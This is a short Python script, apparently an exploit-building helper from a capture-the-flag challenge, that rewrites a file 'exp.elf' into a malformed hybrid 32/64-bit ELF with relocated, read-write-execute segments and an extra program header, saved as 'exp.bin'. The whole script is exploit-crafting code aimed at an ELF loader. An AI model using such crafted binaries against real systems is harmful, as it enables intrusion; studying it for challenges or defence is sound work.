from lief import ELF
from pwn import p16, p32, p64
from ctypes import *

def replace(dst, offset, src):
    return dst[:offset] + src + dst[offset+len(src):]

elf = open("exp.elf", "rb").read()
magic = b'\x7fELF\x01\x01\x01' + b'\x00'*9

phdrs = elf[0x40:0x40+0x70]

elf = magic + elf[len(magic):]

elf = replace(elf, 0x2c, p16(1))
elf = replace(elf, 0x1c, p16(0x34))
elf = replace(elf, 0x28, p16(0x34))

class Phdr64(Structure):
    _fields_ = [
        ("p_type", c_uint),
        ("p_flags", c_uint),
        ("p_offset", c_ulong),
        ("p_vaddr", c_ulong),
        ("p_paddr", c_ulong),
        ("p_filesz", c_ulong),
        ("p_memsz", c_ulong),
        ("p_align", c_ulong),
    ]

phoff = 0x80
elf = replace(elf, 0x20, p16(phoff))
elf = replace(elf, 0x38, p16(3))

code32 = Phdr64.from_buffer_copy(phdrs[sizeof(Phdr64):])
phdrs = [Phdr64.from_buffer_copy(phdrs[i:i+sizeof(Phdr64)]) for i in range(0, len(phdrs), sizeof(Phdr64))]

for phdr in phdrs:
    phdr.p_vaddr += 0x3400000000
    phdr.p_flags = 7

phdrs.append(code32)
code32.p_flags = 7

phdrs = b"".join([bytes(phdr) for phdr in phdrs])
elf = replace(elf, phoff, phdrs)

open("exp.bin", "wb").write(elf)